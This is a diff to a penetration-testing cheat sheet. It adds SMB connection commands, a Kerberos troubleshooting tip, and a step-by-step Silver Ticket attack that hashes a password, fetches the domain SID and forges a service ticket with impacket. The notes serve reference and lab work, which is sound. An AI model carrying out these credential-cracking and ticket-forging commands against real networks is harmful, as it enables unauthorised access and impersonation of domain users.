@@ -103,6 +103,22 @@ crackmapexec smb <ip> -u ""
 crackmapexec smb <ip> -u <username/file> -p <password/file>
 ```
 
+## Connecting
+### smbclient
+```bash
+smbclient //<ip> -U <user>
+```
+
+### smbclient.py
+*impacket-smbclient*
+
+```bash
+# Normal login
+smbclient.py <domain>/<username>:<password>@<ip>
+
+# Auth with kerberos
+smbclient.py -k <domain>/<username>:<password>@<ip> -dc-ip <ip>
+```
 
 # Kerberos
 ## GetNPUsers.py
@@ -125,8 +141,42 @@ GetUserSPNs.py -request -dc-ip <ip> domain.local/user -save -outputfile <output_
 hashcat -m 13100 --force <hash_file> <password_file>
 ```
 
+### Troubleshooting
+#### NTLM hash disabled
+Use the `-k` option as well as `-dc-host` instead of `-dc-ip`. As that will break the authentication and throw an error.
+
 #### References
 - [https://www.crowdstrike.com/cybersecurity-101/kerberoasting/](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/)
+
+
+## Silver ticket attack
+A Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC. Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.
+
+### Steps
+1. Generate NTLM hash
+    ```bash
+    iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4
+    ```
+2. Get Domain SID
+    *Use impacket-getPac*
+    ```bash
+    getPac.py -targetUser <username> <domain>/<username>:<password>
+    ```
+3. Generate ticket
+    *Use impacket-ticketer*
+    ```bash
+    ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain <domain> -dc-ip <ip> -spn <service_spn> <username>
+    ```
+4. Add the ticket location to `KRB5CCNAME`
+    ```bash
+    KRB5CCNAME=<username>.ccache klist
+    ```
+
+
+### References
+- [https://www.crowdstrike.com/cybersecurity-101/attack-types/silver-ticket-attack/](https://www.crowdstrike.com/cybersecurity-101/attack-types/silver-ticket-attack/)
+- [https://adsecurity.org/?p=2011](https://adsecurity.org/?p=2011)
+
 
 # RPC
 # Enumeration
